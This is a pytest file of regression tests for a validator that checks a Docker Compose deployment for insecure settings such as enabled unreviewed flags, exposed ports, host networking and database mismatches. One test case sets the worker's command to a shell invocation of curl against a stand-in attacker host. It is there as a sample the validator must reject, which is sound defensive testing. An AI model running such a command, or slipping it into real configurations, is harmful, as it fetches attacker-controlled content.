"""No-network operator safety regressions; fixed synthetic Compose responses."""
import json
from copy import deepcopy

import pytest

from scripts import check_public_operator_compose as gate
from scripts.ci_public_pilot_release_policy import UNVERIFIED_FLAGS


def resolved():
    postgres="postgresql://synthetic:synthetic@db.example.invalid:5432/disposable"
    appflags={key:"false" for key in UNVERIFIED_FLAGS}
    base={"DATABASE_URL":postgres,"VALYQON_DATABASE_REQUIRE_POSTGRES":"true",
          "MONITORING_ENABLED":"false",**appflags}
    return {
        "services":{
            "api":{"environment":{**base,
                                   "VALYQON_RESTRICT_PAID_SOURCE_DETAILS":"true"},
                   "networks":{"edge":{}}},
            "bot":{"environment":dict(base),
                   "profiles":["authorized-telegram"],"networks":{"edge":{}}},
            "connector-worker":{
                "environment":dict(base),"profiles":["reviewed-source-worker"],
                "command":["python","-m","app.jobs.worker","--connectors"],
                "depends_on":{"api":{"condition":"service_healthy"}},
                "networks":{"edge":{}},
            },
            "caddy":{"ports":[{"target":80,"published":"80"},{"target":443,"published":"443"}],
                     "environment":{"TENDERLENS_DOMAIN":"stage.example.invalid"}},
        }
    }


def set_transport(monkeypatch,document):
    def fake(*args):
        if args==("config","--services"):
            return "api\ncaddy\n"
        if args==("--profile","authorized-telegram","config","--services"):
            return "api\nbot\ncaddy\n"
        if args==("--profile","reviewed-source-worker","config","--services"):
            return "api\nconnector-worker\ncaddy\n"
        if args==("--profile","authorized-telegram","--profile","reviewed-source-worker",
                  "config","--format","json"):
            return json.dumps(document)
        raise AssertionError("Unexpected command")
    monkeypatch.setattr(gate,"_cmd",fake)


def test_strict_opt_in_and_one_postgres_database(monkeypatch):
    set_transport(monkeypatch,resolved())
    result=gate.validate()
    assert result["status"]=="OFFLINE_OPERATOR_COMPOSE_CONTRACTS_PASS"
    assert result["default_services"]==["api","caddy"]
    assert result["connector_opt_in"]==["connector-worker"]
    assert result["telegram_opt_in"]==["bot"]
    assert result["production_changed"] is False
    assert result["commercial_launch_approved"] is False


@pytest.mark.parametrize("bad",[
    "worker-flag","bot-flag","api-flag","db-divergence","sqlite","worker-port",
    "worker-host-net","bot-polling","autostart-worker","bot-autostart",
    "missing-api-dependency","wrong-worker-entrypoint",
])
def test_fail_closed_when_operator_compose_contains_insecure_config(monkeypatch,bad):
    doc=resolved()
    worker=doc["services"]["connector-worker"]
    if bad=="worker-flag":worker["environment"]["TEKTORG_PUBLIC_ENABLED"]="true"
    elif bad=="bot-flag":doc["services"]["bot"]["environment"]["VALYQON_DEADLINE_ALERTS_ENABLED"]="true"
    elif bad=="api-flag":doc["services"]["api"]["environment"]["B2B_CENTER_ENABLED"]="true"
    elif bad=="db-divergence":worker["environment"]["DATABASE_URL"]+="2"
    elif bad=="sqlite":worker["environment"]["DATABASE_URL"]="sqlite:///production.db"
    elif bad=="worker-port":worker["ports"]=[{"target":18765,"published":"18765"}]
    elif bad=="worker-host-net":worker["network_mode"]="host"
    elif bad=="bot-polling":doc["services"]["bot"]["environment"]["MONITORING_ENABLED"]="true"
    elif bad=="autostart-worker":worker["profiles"]=[]
    elif bad=="bot-autostart":doc["services"]["bot"]["profiles"]=[]
    elif bad=="missing-api-dependency":worker["depends_on"]={}
    elif bad=="wrong-worker-entrypoint":worker["command"]=["sh","-c","curl evil.example"]
    set_transport(monkeypatch,doc)
    with pytest.raises(RuntimeError):
        gate.validate()


def test_worker_source_flags_match_public_release_policy():
    compose=open("compose.public-operator.yaml",encoding="utf-8").read()
    for flag in UNVERIFIED_FLAGS:
        # Both the worker and the explicit bot service are fail-closed even
        # with an operator .env containing unreviewed true flags.
        assert compose.count(flag+': "false"')>=2,flag
    assert "reviewed-source-worker" in compose
    assert "authorized-telegram" in compose
    assert 'command: ["python", "-m", "app.jobs.worker", "--connectors"]' in compose
